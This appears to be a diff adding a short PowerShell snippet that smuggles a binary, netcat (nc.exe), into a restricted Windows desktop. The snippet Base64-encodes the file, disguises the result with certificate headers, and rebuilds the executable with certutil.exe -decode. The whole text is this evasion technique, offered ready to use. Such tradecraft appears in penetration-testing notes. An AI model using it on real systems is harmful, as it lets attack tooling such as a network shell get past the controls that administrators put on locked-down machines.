@@ -1,0 +1,13 @@
+# Encode binary into Base64 Using PowerShell
+# Save binary data outside a restricted environment, format it as certificate, and use native certutil.exe 
+# command to write out the binary file again
+
+$raw = Get-Content -Path c:\nc.exe -Encoding Byte
+$b64 = [System.Convert]::ToBase64String($raw)
+$begin= "-----BEGIN CERTIFICATE-----"
+$end = "-----END CERTIFICATE-----"
+"$begin$b64$end" | Out-File c:\nc.txt
+
+#In the resticted desktop, copy/paste the text and save the text file. Then use
+# the command below to write the bytes back to a binary file
+certutil.exe -decode nc.txt nc.exe
